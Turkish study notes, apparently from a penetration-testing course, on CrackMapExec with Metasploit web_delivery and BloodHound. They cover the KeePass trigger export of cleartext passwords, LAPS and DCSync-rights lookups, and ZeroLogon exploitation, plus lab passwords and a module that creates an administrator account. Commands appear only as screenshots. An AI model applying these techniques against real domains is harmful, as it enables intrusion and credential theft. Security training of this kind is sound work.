+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
